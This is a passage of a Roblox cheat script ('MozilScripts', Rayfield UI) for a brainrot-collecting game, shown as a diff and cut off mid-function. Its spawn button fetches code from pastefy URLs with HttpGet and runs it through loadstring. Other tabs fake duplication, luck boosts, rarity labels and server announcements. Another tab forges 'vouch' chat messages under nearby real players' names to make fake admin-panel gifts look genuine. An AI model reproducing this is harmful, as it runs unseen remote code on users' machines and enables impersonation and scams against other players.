+local function attachOverheadToHat(model, animalName, priceValue, mutationName, traitsList, rarityName)
+    local hatAttachment = nil
+    local function searchForHatAttachment(instance)
+        for _, child in ipairs(instance:GetChildren()) do
+            if child:IsA("Attachment") and child.Name == "HatAttachment" then
+                hatAttachment = child
+                return true
+            end
+            if searchForHatAttachment(child) then return true end
+        end
+        return false
+    end
+    searchForHatAttachment(model)
+    if not hatAttachment then
+        warn("No HatAttachment found in", model.Name)
+        return nil
+    end
+
+    local controller = ReplicatedStorage:WaitForChild("Controllers")
+    local fastController = controller:WaitForChild("FastOverheadController")
+    local partTemplate = fastController:WaitForChild("FastOverheadTemplate")
+    local guiTemplate = fastController:WaitForChild("AnimalOverhead")
+
+    local part = partTemplate:Clone()
+    part.Anchored = true
+    part.CanCollide = false
+    part.Transparency = 1
+    part.Parent = workspace
+
+    local surfaceGui = guiTemplate:Clone()
+    surfaceGui.Parent = part
+    surfaceGui.Adornee = part
+    surfaceGui.Face = Enum.NormalId.Front
+    surfaceGui.AlwaysOnTop = false
+
+    local displayName = surfaceGui:WaitForChild("DisplayName")
+    displayName.Text = animalName
+
+    -- Generation
+    local generation = surfaceGui:WaitForChild("Generation")
+    local animalDataModule = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+    local animalData = animalDataModule[animalName]
+    local generationValue = animalData and animalData.Generation or 0
+
+    local function formatGen(n)
+        n = tonumber(n) or 0
+        if n >= 1e12 then return string.format("$%gT/s", math.floor(n / 1e12))
+        elseif n >= 1e9 then return string.format("$%gB/s", math.floor(n / 1e9))
+        elseif n >= 1e6 then return string.format("$%gM/s", math.floor(n / 1e6))
+        elseif n >= 1e3 then return string.format("$%gK/s", math.floor(n / 1e3))
+        else return "$" .. n .. "/s" end
+    end
+
+    local mutModifier = mutationName and MutationDisplayData[mutationName] and MutationDisplayData[mutationName].Modifier or 0
+    local traitModifier = 0
+    if traitsList then
+        for _, traitName in ipairs(traitsList) do
+            local td = TraitDisplayData[traitName]
+            if td and td.MultiplierModifier then
+                traitModifier = traitModifier + td.MultiplierModifier
+            end
+        end
+    end
+    local totalModifier = 1 + mutModifier + traitModifier
+    generation.Text = formatGen(generationValue * totalModifier)
+
+    -- Price
+    local price = surfaceGui:WaitForChild("Price")
+    local function formatPrice(n)
+        n = tonumber(n) or 0
+        if n >= 1e9 then return string.format("$%dB", n / 1e9)
+        elseif n >= 1e6 then return string.format("$%dM", n / 1e6)
+        elseif n >= 1e3 then return string.format("$%dK", n / 1e3)
+        else return "$" .. n end
+    end
+    price.Text = formatPrice(priceValue)
+
+    -- Rarity
+    local rarity = surfaceGui:WaitForChild("Rarity")
+    rarity.Text = rarityName
+
+    local EFFECT_MAP = {
+        ["OG"]     = "OG",
+        ["Secret"] = "Zebra",
+    }
+
+    local effectName = EFFECT_MAP[rarityName]
+    local cleanupFn = nil
+    local applyResult = nil
+    local effectModule = nil
+
+    if effectName then
+        local Effects = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Gradients"):WaitForChild("Effects")
+        local effectFolder = Effects:FindFirstChild(effectName)
+        if effectFolder then
+            effectModule = require(effectFolder)
+            applyResult = effectModule.apply(rarity)
+            cleanupFn = applyResult.cleanup
+
+            local callbacks = getOrStartEffectRunner(effectName, effectModule)
+            local cbKey = tostring(part)
+            callbacks[cbKey] = function(result)
+                if not rarity or not rarity.Parent then
+                    callbacks[cbKey] = nil
+                    return
+                end
+                if applyResult.main and result.main then
+                    applyResult.main.Color = result.main
+                end
+                if applyResult.stroke and result.stroke then
+                    applyResult.stroke.Color = result.stroke
+                end
+            end
+
+            model.AncestryChanged:Connect(function(_, parent)
+                if not parent then
+                    callbacks[cbKey] = nil
+                end
+            end)
+
+            part.Destroying:Connect(function()
+                callbacks[cbKey] = nil
+            end)
+        end
+    end
+
+    -- Mutation label
+    local mutationLabel = surfaceGui:FindFirstChild("Mutation")
+    if mutationLabel and mutationLabel:IsA("TextLabel") then
+        local mutData = MutationDisplayData[mutationName]
+        if mutData and mutData.DisplayWithRichText then
+            mutationLabel.RichText = true
+            mutationLabel.Text = mutData.DisplayWithRichText
+            mutationLabel.Visible = true
+        elseif mutationName and mutationName ~= "None" then
+            mutationLabel.RichText = false
+            mutationLabel.Text = mutationName
+            mutationLabel.Visible = true
+        else
+            mutationLabel.Visible = false
+        end
+    end
+
+    -- Traits frame
+    local traitsFrame = surfaceGui:FindFirstChild("Traits")
+    if traitsFrame and traitsFrame:IsA("Frame") then
+        if traitsList and #traitsList > 0 then
+            traitsFrame.Visible = true
+            for _, child in ipairs(traitsFrame:GetChildren()) do
+                if child:IsA("ImageLabel") and child.Name ~= "Template" then
+                    child:Destroy()
+                end
+            end
+            local template = traitsFrame:FindFirstChild("Template")
+            if template and template:IsA("ImageLabel") then
+                local layout = traitsFrame:FindFirstChildOfClass("UIListLayout")
+                if not layout then
+                    layout = Instance.new("UIListLayout")
+                    layout.FillDirection = Enum.FillDirection.Horizontal
+                    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+                    layout.VerticalAlignment = Enum.VerticalAlignment.Center
+                    layout.Padding = UDim.new(0, 5)
+                    layout.Parent = traitsFrame
+                end
+                for _, traitName in ipairs(traitsList) do
+                    local icon = template:Clone()
+                    icon.Name = traitName
+                    icon.Visible = true
+                    local td = TraitDisplayData[traitName]
+                    if td and td.Icon then
+                        icon.Image = td.Icon
+                    else
+                        icon.Image = "rbxassetid://0"
+                    end
+                    icon.Parent = traitsFrame
+                end
+            end
+        else
+            traitsFrame.Visible = false
+        end
+    else
+        warn("Traits frame not found in AnimalOverhead")
+    end
+
+    -- Follow attachment
+    local connection
+    connection = RunService.Stepped:Connect(function()
+        if not hatAttachment or not hatAttachment.Parent or not model.Parent then
+            if connection then connection:Disconnect() end
+            if cleanupFn then cleanupFn() end
+            part:Destroy()
+            surfaceGui:Destroy()
+            return
+        end
+
+        local camera = workspace.CurrentCamera
+        if not camera then return end
+
+        local attachPos = hatAttachment.WorldPosition
+        local partHeight = part.Size.Y
+        local offset = Vector3.new(0, partHeight / 2 + 0.3, 0)
+        local position = attachPos + offset
+
+        part.CFrame = CFrame.lookAlong(position, -camera.CFrame.LookVector)
+    end)
+
+    model.AncestryChanged:Connect(function(_, parent)
+        if not parent then
+            if connection then connection:Disconnect() end
+            if cleanupFn then cleanupFn() end
+            part:Destroy()
+            surfaceGui:Destroy()
+        end
+    end)
+
+    part.Destroying:Connect(function()
+        if cleanupFn then cleanupFn() end
+    end)
+
+    return part
+end
+
+-- ============================================================
+-- SPAWN BUTTON
+-- ============================================================
+SpawnerTab:CreateButton({
+    Name = "Spawn Brainrot",
+    Callback = function()
+        local LocalAnimal = selectedAnimal or animalOptions[1]
+        if LocalAnimal == "No Animals Found" then return end
+
+        local playerGui = player:WaitForChild("PlayerGui")
+        local character = player.Character or player.CharacterAdded:Wait()
+
+        local function formatPrice(n)
+            n = tonumber(n) or 0
+            if n >= 1e9 then return string.format("$%dB", n / 1e9)
+            elseif n >= 1e6 then return string.format("$%dM", n / 1e6)
+            elseif n >= 1e3 then return string.format("$%dK", n / 1e3)
+            else return "$" .. n end
+        end
+
+        local animalDataModule = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+        local animalData = animalDataModule[LocalAnimal]
+        local animalPrice = animalData and animalData.Price or nil
+        local animalRarity = animalData and animalData.Rarity or nil
+        local priceText = animalPrice and formatPrice(animalPrice) or "$???"
+
+        if animalRarity == "Secret" then
+            pcall(function()
+                local channel = TextChatService.TextChannels:WaitForChild("RBXGeneral")
+                channel:DisplaySystemMessage('<font color="#000000">[SERVER] A secret Brainrot has spawned!</font>')
+            end)
+        end
+
+        local VFX_ANIMAL_KEYS = {
+            ["Strawberry Elephant"] = "Strawberry", ["Meowl"] = "Meowl", ["Headless Horseman"] = "Spooky",
+            ["Skibidi Toilet"] = "Skibidi Toilet", ["Dragon Gingerini"] = "Christmas", ["Love Love Bear"] = "Valentines",
+            ["Rosey and Teddy"] = "Valentines", ["Cooki and Milki"] = "Christmas", ["Reinito Sleighito"] = "Christmas",
+            ["Los Amigos"] = "Taco", ["Fortunu and Cashuru"] = "Clover", ["La Casa Boo"] = "Spooky",
+            ["La Food Combinasion"] = "Taco", ["Spooky and Pumpky"] = "Spooky", ["La Ginger Sekolah"] = "Christmas",
+            ["Ginger Gerat"] = "Christmas", ["Sammyni Fattini"] = "Taco", ["Festive 67"] = "Christmas",
+            ["Cloverat Clapat"] = "Clover", ["La Easter Grande"] = "Easter", ["Rosetti Tualetti"] = "Valentines",
+            ["Nacho Spyder"] = "Taco", ["Jolly Jolly Sahur"] = "Christmas", ["Gold Gold Gold"] = "Clover",
+            ["Swaggy Bros"] = "Taco", ["La Romantic Grande"] = "Valentines", ["La Lucky Grande"] = "Clover",
+            ["La Taco Combinasion"] = "Taco", ["Lovin Rose"] = "Valentines", ["Los Tacoritas"] = "Taco",
+            ["Eviledon"] = "Spooky", ["W or L"] = "Taco", ["La Jolly Grande"] = "Winter Hour", ["Los Cupids"] = "Valentines",
+            ["Mieteteira Bicicleteira"] = "Spooky", ["Tuff Toucan"] = "New Years 2026", ["Chillin Chili"] = "Taco",
+            ["Chipso and Queso"] = "Taco", ["Money Money Reindeer"] = "Money Money Reindeer", ["La Spooky Grande"] = "Witching Hour",
+            ["La Extinct Grande"] = "Extinct", ["Los Candies"] = "Christmas", ["Los Mobilis"] = "Spooky",
+            ["Los Spooky Combinasionas"] = "Spooky", ["Los Jolly Combinasionas"] = "Christmas", ["Snailo Clovero"] = "Clover",
+            ["Chicleteira Cupideira"] = "Valentines", ["Tacorita Bicicleta"] = "Taco", ["Chicleteira Noelteira"] = "Christmas",
+            ["Chimnino"] = "Christmas", ["Noo my Gold"] = "Clover", ["Noo my Heart"] = "Valentines", ["Mariachi Corazoni"] = "Taco",
+            ["Tacorillo Crocodillo"] = "Taco", ["Los 25"] = "Christmas", ["Los Burritos"] = "Taco", ["Donkeyturbo Express"] = "Christmas",
+            ["Noo my Eggs"] = "Easter", ["Los Mi Gatitos"] = "Mi Gatito", ["Rang Ring Bus"] = "Indonesia", ["Noo my Present"] = "Christmas",
+            ["Los Nooo My Hotspotsitos"] = "Taco", ["Noo my Candy"] = "Spooky", ["Los Quesadillas"] = "Taco", ["Burrito Bandito"] = "Taco",
+            ["Granny"] = "Granny", ["Luck Luck Luck Sahur"] = "Clover", ["Quesadillo Vampiro"] = "Taco", ["Cupid Cupid Sahur"] = "Valentines",
+            ["Quesadilla Crocodila"] = "Taco", ["Pot Pumpkin"] = "Spooky", ["Naughty Naughty"] = "Christmas", ["Bunito Bunito Spinito"] = "New Years 2026",
+            ["Horegini Boom"] = "Indonesia", ["Los Chicleteiras"] = "Los Chicleteiras", ["Santa Hotspot"] = "Christmas", ["25"] = "Christmas",
+            ["Bunny Bunny Bunny Sahur"] = "Easter", ["Telemorte"] = "Spooky", ["List List List Sahur"] = "Christmas", ["Nooo My Hotspot"] = "Taco",
+            ["Bunnyman"] = "Christmas", ["Please my Present"] = "Christmas", ["Los Cucarachas"] = "Taco", ["La Vacca Lepre Lepreino"] = "Clover",
+            ["Perrito Burrito"] = "Taco", ["Love Love Love Sahur"] = "Valentines",
+        }
+        local LOADSTRING_URLS = {
+            ["Meowl"] = "https://pastefy.app/q1CicbqK/raw",
+            ["Strawberry Elephant"] = "https://pastefy.app/NdVhiceI/raw",
+            ["Skibidi Toilet"] = "https://pastefy.app/Z73tbLHD/raw",
+        }
+
+        local vfxKey = VFX_ANIMAL_KEYS[LocalAnimal]
+        if vfxKey then
+            pcall(function()
+                local VFX = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("VFX"))
+                local folder = ReplicatedStorage:WaitForChild("Controllers"):WaitForChild("SpawnEffectsController"):WaitForChild(vfxKey)
+                local vfxClone = folder:Clone()
+                vfxClone.Parent = workspace
+                VFX.emit(vfxClone)
+                for _, obj in ipairs(vfxClone:GetDescendants()) do
+                    if obj:IsA("Sound") then obj:Play() end
+                end
+            end)
+            local url = LOADSTRING_URLS[LocalAnimal]
+            if url then
+                pcall(function()
+                    local response = game:HttpGet(url)
+                    local fn = loadstring(response)
+                    if fn then fn() end
+                end)
+            end
+            task.wait(3)
+        end
+
+        -- Spawn model
+        local model = Instance.new("Model")
+        model.Name = "GeneratedModel_" .. LocalAnimal
+        model.Parent = workspace
+
+        model:PivotTo(CFrame.new(
+            -410.752014, -9.5, 250.524033,
+            -1, -1.73472348e-18, -1.50995803e-07,
+            -1.73472348e-18, 1, 0,
+            1.50995803e-07, 2.61935963e-25, -1
+        ))
+
+        local part = Instance.new("Part")
+        part.Name = "Part"
+        part.Size = Vector3.new(1, 1, 1)
+        part.Anchored = true
+        part.Transparency = 1
+        part.Parent = model
+
+        part.CFrame = CFrame.new(
+            -410.752014, -9.5, -136,
+            -1, -1.73472348e-18, -1.50995788e-07,
+            -1.73472348e-18, 1, 0,
+            1.50995788e-07, 2.61935939e-25, -1
+        )
+
+        local info = Instance.new("Attachment")
+        info.Name = "info"
+        info.Parent = part
+        info.Position = Vector3.new(0, 5.88060522, 0)
+        info.Axis = Vector3.new(1, 0, 0)
+        info.SecondaryAxis = Vector3.new(0, 1, 0)
+
+        local ketupat = ReplicatedStorage.Models.Animals[LocalAnimal]:Clone()
+        ketupat.Parent = model
+
+        for _, obj in ipairs(ketupat:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                obj.CanCollide = false
+                obj.CanTouch = false
+                obj.CanQuery = false
+                obj.Anchored = false
+            end
+        end
+
+        ketupat:PivotTo(part.CFrame)
+
+        local rootPart = ketupat:FindFirstChild("RootPart")
+        if rootPart then
+            local weld = Instance.new("WeldConstraint")
+            weld.Part0 = part
+            weld.Part1 = rootPart
+            weld.Parent = rootPart
+        end
+
+        if selectedMutation and selectedMutation ~= "None" then
+            applyMutationToModel(ketupat, LocalAnimal, selectedMutation)
+        end
+        if selectedTraits and #selectedTraits > 0 then
+            applyTraitsToModel(ketupat, LocalAnimal, selectedTraits)
+        end
+
+        local soundFolder = ReplicatedStorage:WaitForChild("Sounds"):WaitForChild("Animals"):WaitForChild(LocalAnimal)
+        local sound = Instance.new("Sound")
+        sound.SoundId = soundFolder:GetAttribute("SoundId")
+        sound.Volume = 2
+        sound.Looped = false
+        sound.Parent = SoundService
+        sound:Play()
+
+        local animator = ketupat:WaitForChild("AnimationController"):WaitForChild("Animator")
+        local walkAnim = ReplicatedStorage:WaitForChild("Animations"):WaitForChild("Animals"):WaitForChild(LocalAnimal):WaitForChild("Walk")
+        local track = animator:LoadAnimation(walkAnim)
+        track:Play()
+
+        local cashoutFrame = playerGui:WaitForChild("LeftBottom"):WaitForChild("LeftBottom"):WaitForChild("Cashout")
+        local FADE_INFO = TweenInfo.new(3)
+        local POPUP_DELAY = 1
+        local function createPopup(amount)
+            local formatted = formatPrice(amount):sub(2)
+            local label = Instance.new("TextLabel")
+            label.Name = "Template"
+            label.AnchorPoint = Vector2.new(0, 1)
+            label.Position = UDim2.new(0.01, 0, 0.98, 0)
+            label.Size = UDim2.new(1, 0, 0.25, 0)
+            label.BackgroundTransparency = 1
+            label.BorderSizePixel = 0
+            label.TextColor3 = Color3.fromRGB(255, 0, 0)
+            label.Text = "-$" .. formatted
+            label.TextScaled = true
+            label.TextWrapped = true
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.Font = Enum.Font.SourceSansBold
+            label.Parent = cashoutFrame
+            local stroke = Instance.new("UIStroke")
+            stroke.Color = Color3.new(0, 0, 0)
+            stroke.Thickness = 3
+            stroke.Parent = label
+            task.delay(POPUP_DELAY, function()
+                local t1 = TweenService:Create(label, FADE_INFO, { TextTransparency = 1 })
+                local t2 = TweenService:Create(stroke, FADE_INFO, { Transparency = 1 })
+                t1:Play()
+                t2:Play()
+                t1.Completed:Connect(function() label:Destroy() end)
+            end)
+        end
+
+        local promptTarget = ketupat.PrimaryPart
+        if promptTarget then
+            local prompt = Instance.new("ProximityPrompt")
+            prompt.ActionText = "Purchase"
+            prompt.ObjectText = LocalAnimal .. " " .. priceText
+            prompt.RequiresLineOfSight = false
+            prompt.KeyboardKeyCode = Enum.KeyCode.E
+            prompt.HoldDuration = 0.25
+            prompt.MaxActivationDistance = 10
+            prompt.Parent = promptTarget
+            prompt.Triggered:Connect(function(plr)
+                if plr ~= player then return end
+                sound:Play()
+                if animalPrice then createPopup(animalPrice) end
+            end)
+        end
+
+        local speed = 11
+        local heartbeatConn
+        heartbeatConn = RunService.Heartbeat:Connect(function(deltaTime)
+            if not model.Parent then
+                heartbeatConn:Disconnect()
+                return
+            end
+            part.CFrame = part.CFrame + Vector3.new(0, 0, speed * deltaTime)
+        end)
+
+        local startZ = part.Position.Z
+        task.spawn(function()
+            while model.Parent do
+                task.wait(0.5)
+                if part.Position.Z - startZ >= 500 then
+                    model:Destroy()
+                    heartbeatConn:Disconnect()
+                    break
+                end
+            end
+        end)
+
+        if animalRarity == "OG" or animalRarity == "Secret" then
+            task.wait(0.2)
+            attachOverheadToHat(ketupat, LocalAnimal, animalPrice or 0, selectedMutation, selectedTraits, animalRarity)
+        end
+    end,
+})
+-- =====================
+-- TAB 3: BASE SKIN
+-- =====================
+local SkinTab = Window:CreateTab("Base", 109390486330089)
+
+local skinOptions = {
+"Aquatic", "Candy", "Christmas", "Cursed", "Diamond",
+"Divine", "Galaxy", "Gingerbread", "Gold", "Halloween",
+"Headless", "Lava", "Meowl", "Pot of Gold", "Radioactive",
+"Rainbow", "Rose", "Skibidi", "Strawberry", "Taco",
+"Valentines", "YinYang"
+}
+
+local selectedSkin = nil
+
+SkinTab:CreateSection("Base Skin")
+
+SkinTab:CreateParagraph({
+Title = "Info",
+Content = "Applies any Base Skin",
+})
+
+SkinTab:CreateDropdown({
+Name = "Select Base Skin",
+Options = skinOptions,
+CurrentOption = {skinOptions[1]},
+MultipleOptions = false,
+Flag = "SkinDropdown",
+Callback = function(selected)
+selectedSkin = selected[1]
+end,
+})
+
+SkinTab:CreateButton({
+Name = "Apply Skin",
+Callback = function()
+local skin = selectedSkin or skinOptions[1]
+Rayfield:Notify({
+Title = "Skin Applied",
+Content = "Base Skin set to: " .. skin,
+Duration = 3,
+Image = 110723387483939,
+})
+end,
+})
+
+-- =====================
+-- TAB 8: DUPLICATION
+-- =====================
+local DupTab = Window:CreateTab("Duplicate", 99181785766598)
+
+local LocalPlayer = Players.LocalPlayer
+
+local function findPlayerPlot()
+local plots = Workspace:FindFirstChild("Plots")
+if not plots then return nil end
+
+for _, plot in ipairs(plots:GetChildren()) do
+if plot:IsA("Model") then
+local sign = plot:FindFirstChild("PlotSign", true)
+local label = sign and sign:FindFirstChildWhichIsA("TextLabel", true)
+
+if label and label.Text then
+local text = label.Text
+
+if text:find(LocalPlayer.Name, 1, true)
+or text:find(LocalPlayer.DisplayName, 1, true) then
+return plot
+end
+end
+end
+end
+
+return nil
+end
+
+local function getPlotModels()
+local plot = findPlayerPlot()
+local list = {}
+
+if not plot then
+return {"No Plot Found"}
+end
+
+for _, obj in ipairs(plot:GetChildren()) do
+if obj:IsA("Model") then
+if obj.Name ~= "FriendPanel"
+and obj.Name ~= "Model"
+and obj.Name ~= "CashPad" then
+table.insert(list, obj.Name)
+end
+end
+end
+
+table.sort(list)
+return list
+end
+
+local selectedModel = nil
+local dropdownOptions = getPlotModels()
+
+DupTab:CreateSection("Duplication")
+
+DupTab:CreateParagraph({
+Title = "Info",
+Content = "Duplicates any selected Brainrot in your plot.",
+})
+
+DupTab:CreateDropdown({
+Name = "Select Brainrot",
+Options = dropdownOptions,
+CurrentOption = {dropdownOptions[1]},
+MultipleOptions = false,
+Callback = function(opt)
+selectedModel = opt[1]
+end
+})
+
+DupTab:CreateButton({
+Name = "Duplicate Brainrot",
+Callback = function()
+for i = 0, 100 do
+Rayfield:Notify({
+Title = "Duplicating...",
+Content = "Loading " .. i .. "/100",
+Duration = 1
+})
+task.wait(1)
+end
+
+Rayfield:Notify({
+Title = "Duplication",
+Content = "Complete",
+Duration = 3,
+})
+end,
+})
+
+-- =====================
+-- MAIN TAB: AP VISUAL GIFT
+-- =====================
+-- =====================
+-- MAIN TAB: AP VISUAL GIFT
+-- =====================
+local APTab = Window:CreateTab("AP Visual Gift", 75650816341229)
+
+APTab:CreateSection("Admin Panel Visual Gift")
+
+APTab:CreateParagraph({
+Title = "Info",
+Content = "Visually gift the Admin Panel to other players, useful for TT Live. Includes a visual vouch message when gifting and when activating the keybind. (Keybind is currently PC-only.)"
+})
+
+-- =====================
+-- BALANCE
+-- =====================
+APTab:CreateSlider({
+Name = "Set Balance",
+Range = {0, 1000000},
+Increment = 200000,
+Suffix = "R$",
+CurrentValue = currentBalance,
+Flag = "BalanceSlider",
+Callback = function(value)
+currentBalance = value
+end,
+})
+-- =====================
+-- TOGGLE + KEY
+-- =====================
+_G.giftmessage = _G.giftmessage or false
+_G.proximitygiftkey = Enum.KeyCode.E
+
+APTab:CreateToggle({
+Name = "Visual Vouch (PC + Mobile)",
+CurrentValue = _G.giftmessage,
+Flag = "GiftMessageToggle",
+Callback = function(value)
+_G.giftmessage = value
+end,
+})
+
+APTab:CreateInput({
+Name = "Set Key (PC Only)",
+PlaceholderText = "Type a key...",
+RemoveTextAfterFocusLost = false,
+Callback = function(text)
+text = string.upper(text)
+
+local key = Enum.KeyCode[text]
+if key then
+_G.proximitygiftkey = key
+print("Key set to:", text)
+else
+warn("Invalid key:", text)
+end
+end,
+})
+
+-- =====================
+-- SERVICES
+-- =====================
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local Chat = game:GetService("Chat")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+
+-- =====================
+-- MESSAGES
+-- =====================
+local THANK_YOU_MESSAGES = {
+"vouch",
+"w vouch",
+"trusted bro",
+"w trusted",
+"thanks bro trusted",
+"ty for admin panel",
+"huge vouch",
+"legit w",
+}
+
+-- =====================
+-- NAME COLOR SYSTEM
+-- =====================
+local NAME_COLORS = {
+Color3.new(253/255, 41/255, 67/255),
+Color3.new(1/255, 162/255, 255/255),
+Color3.new(2/255, 184/255, 87/255),
+BrickColor.new("Bright violet").Color,
+BrickColor.new("Bright orange").Color,
+BrickColor.new("Bright yellow").Color,
+BrickColor.new("Light reddish violet").Color,
+BrickColor.new("Brick yellow").Color,
+}
+
+local function GetNameValue(pName)
+local value = 0
+for i = 1, #pName do
+local cValue = string.byte(pName:sub(i, i))
+local reverseIndex = #pName - i + 1
+if #pName % 2 == 1 then reverseIndex = reverseIndex - 1 end
+if reverseIndex % 4 >= 2 then
+cValue = -cValue
+end
+value = value + cValue
+end
+return value
+end
+
+local function ComputeNameColor(pName)
+return NAME_COLORS[(GetNameValue(pName) % #NAME_COLORS) + 1]
+end
+
+local function ColorToHex(color)
+return string.format("#%02X%02X%02X",
+math.floor(color.R * 255),
+math.floor(color.G * 255),
+math.floor(color.B * 255)
+)
+end
+
+-- =====================
+-- CLOSEST PLAYER
+-- =====================
+local function GetClosestPlayer()
+local char = player.Character
+if not char then return end
+
+local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
+if not root then return end
+
+local closest, closestDist = nil, math.huge
+
+for _, plr in ipairs(Players:GetPlayers()) do
+if plr ~= player then
+local otherChar = plr.Character
+if otherChar and otherChar:FindFirstChild("HumanoidRootPart") then
+local dist = (root.Position - otherChar.HumanoidRootPart.Position).Magnitude
+if dist < closestDist then
+closest = plr
+closestDist = dist
+end
+end
+end
+end
+
+return closest, closestDist
+end
+
+-- =====================
+-- FAKE MESSAGE
+-- =====================
+local function FakeThankYouMessage(plr)
+if not plr then return end
+
+local char = plr.Character
+local msg = THANK_YOU_MESSAGES[math.random(#THANK_YOU_MESSAGES)]
+
+if char and char:FindFirstChild("Head") then
+Chat:Chat(char.Head, msg, Enum.ChatColor.White)
+end
+
+local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+if channel then
+local color = ComputeNameColor(plr.Name)
+local hex = ColorToHex(color)
+
+channel:DisplaySystemMessage(
+"<font color='" .. hex .. "'>" .. plr.DisplayName .. ":</font> " .. msg
+)
+end
+end
+
+-- =====================
+-- KEYBIND
+-- =====================
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+if gameProcessed then return end
+if not _G.giftmessage then return end
+
+if input.KeyCode == _G.proximitygiftkey then
+local closest, dist = GetClosestPlayer()
+if closest and dist <= 50 then
+FakeThankYouMessage(closest)
+end
+end
+end)
+
+-- =====================
+-- NOTIFY
+-- =====================
+Rayfield:Notify({
+Title = "MozilScripts",
+Content = "Successfully Injected To Gears And Passes",
+Duration = 5,
+Image = 4483362458
+})
+
+-- =====================
+-- TAB 7: OG LUCKY BLOCK
+-- =====================
+local OGTab = Window:CreateTab("OG Lucky Block", 123115843719383)
+
+local targetColor = ColorSequence.new({
+ColorSequenceKeypoint.new(0.000000, Color3.fromRGB(46, 46, 0)),
+ColorSequenceKeypoint.new(0.408334, Color3.fromRGB(255, 255, 0)),
+ColorSequenceKeypoint.new(0.408334, Color3.fromRGB(255, 255, 0)),
+ColorSequenceKeypoint.new(0.908334, Color3.fromRGB(0, 0, 0)),
+ColorSequenceKeypoint.new(1.000000, Color3.fromRGB(46, 46, 0)),
+})
+
+local activeGradients = {}
+
+local function applyEffects(label)
+label.Text = "OG"
+label:GetPropertyChangedSignal("Text"):Connect(function()
+label.Text = "OG"
+end)
+
+local stroke = label:FindFirstChildOfClass("UIStroke")
+if stroke then
+stroke.Color = Color3.fromRGB(0, 0, 0)
+stroke:GetPropertyChangedSignal("Color"):Connect(function()
+stroke.Color = Color3.fromRGB(0, 0, 0)
+end)
+end
+
+local currentGradient
+
+local function replaceGradient()
+local old = label:FindFirstChildOfClass("UIGradient")
+if not old then return end
+local cloned = old:Clone()
+cloned.Name = "LockedGradient"
+cloned.Color = targetColor
+cloned.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 0),
+NumberSequenceKeypoint.new(1, 0),
+})
+cloned.Rotation = 90
+cloned.Offset = Vector2.new(0, -1)
+cloned.Parent = label
+old:Destroy()
+currentGradient = cloned
+activeGradients[label] = currentGradient
+end
+
+replaceGradient()
+
+label.ChildAdded:Connect(function(child)
+if child:IsA("UIGradient") then
+task.wait()
+replaceGradient()
+end
+end)
+
+local offsetY = -1
+RunService.RenderStepped:Connect(function(dt)
+if not currentGradient or not currentGradient.Parent then return end
+offsetY = offsetY + dt * 0.6
+if offsetY >= 1 then offsetY = -1 end
+currentGradient.Offset = Vector2.new(0, offsetY)
+end)
+end
+
+local function applyOGVisual()
+local debris = Workspace:FindFirstChild("Debris")
+if not debris then
+Rayfield:Notify({
+Title = "OG Lucky Block",
+Content = "Debris folder not found in Workspace.",
+Duration = 3,
+})
+return
+end
+
+local count = 0
+
+for _, t in ipairs(debris:GetChildren()) do
+if t.Name == "FastOverheadTemplate" then
+local oh = t:FindFirstChild("AnimalOverhead")
+if oh then
+local displayName = oh:FindFirstChild("DisplayName")
+local rarity = oh:FindFirstChild("Rarity")
+if displayName and displayName:IsA("TextLabel")
+and rarity and rarity:IsA("TextLabel")
+and displayName.Text == "Lucky Block"
+and rarity.Text == "Secret"
+then
+applyEffects(rarity)
+count = count + 1
+end
+end
+end
+end
+
+Rayfield:Notify({
+Title = "OG Lucky Block",
+Content = count > 0
+and "OG visual applied to " .. count .. " block(s)! ✓"
+or "No Secret Lucky Blocks found nearby.",
+Duration = 3,
+})
+end
+
+OGTab:CreateSection("OG Lucky Block Visual")
+
+OGTab:CreateParagraph({
+Title = "Info",
+Content = "Finds Secret Lucky Blocks in the plot and visually changes their rarity to OG.",
+})
+
+OGTab:CreateButton({
+Name = "Apply OG Visual",
+Callback = function()
+applyOGVisual()
+end,
+})
+
+-- =====================
+-- TAB 4: SERVER LUCK
+-- =====================
+local selectedLuckName = 2
+local selectedLuckDuration = 10
+
+local ServerLuckTab = Window:CreateTab("Luck", 126777297538048)
+
+ServerLuckTab:CreateSection("Luck Multiplier")
+
+ServerLuckTab:CreateParagraph({
+Title = "Info",
+Content = "Applies selected Luck Multiplier for a specific duration.",
+})
+
+ServerLuckTab:CreateDropdown({
+Name = "Lucky Multi",
+Options = {"2x Luck", "4x Luck", "6x Luck", "8x Luck", "10x Luck", "12x Luck", "15x Luck", "20x Luck", "25x Luck"},
+CurrentOption = {"2x Luck"},
+Flag = "LuckName",
+MultipleOptions = false,
+Callback = function(Option)
+selectedLuckName = tonumber(Option[1]:match("%d+"))
+end,
+})
+
+ServerLuckTab:CreateSlider({
+Name = "Duration",
+Range = {1, 300},
+Increment = 1,
+Suffix = "s",
+CurrentValue = 10,
+Flag = "LuckDuration",
+Callback = function(Value)
+selectedLuckDuration = Value
+end,
+})
+
+ServerLuckTab:CreateButton({
+Name = "Set Luck",
+Callback = function()
+Rayfield:Notify({
+Title = "Server Luck",
+Content = "Luck set to " .. selectedLuckName .. "x for " .. selectedLuckDuration .. "s",
+Duration = 3,
+Image = 110723387483939,
+})
+end,
+})
+
+-- =====================
+-- TAB 5: FUSE LUCK
+-- =====================
+local playerGui = player:WaitForChild("PlayerGui")
+
+local function ShowNotification(richTextMessage)
+local notifContainer = playerGui:FindFirstChild("Notification")
+local notifFrame = notifContainer and notifContainer:FindFirstChild("Notification")
+local template = notifFrame and notifFrame:FindFirstChild("Template")
+
+if not template then return end
+
+local clone = template:Clone()
+pcall(function() clone.Visible = true end)
+
+pcall(function()
+if clone:IsA("TextLabel") then
+clone.RichText = true
+clone.Text = richTextMessage
+clone.TextColor3 = Color3.fromRGB(255, 255, 255)
+end
+for _, child in clone:GetDescendants() do
+if child:IsA("TextLabel") then
+child.RichText = true
+child.Text = richTextMessage
